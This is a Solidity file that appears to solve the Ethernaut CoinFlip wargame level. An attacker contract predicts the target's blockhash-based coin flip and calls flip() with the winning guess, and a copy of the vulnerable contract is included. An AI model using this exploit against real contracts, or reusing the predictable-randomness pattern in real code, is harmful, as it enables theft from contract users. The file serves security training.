// SPDX-License-Identifier: MIT
pragma solidity ^0.6.7;

import "./library/SafeMath.sol";

contract CoinflipAttacker {
  using SafeMath for uint256;

  CoinFlip private coinflip = CoinFlip(0x0BE8a519166DC89Df876F4eEBB04AAfFD31DC94c); // ethernaut vulnerable contract

  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function attack() public {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;
    coinflip.flip(side);
  }
}

contract CoinFlip {
  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
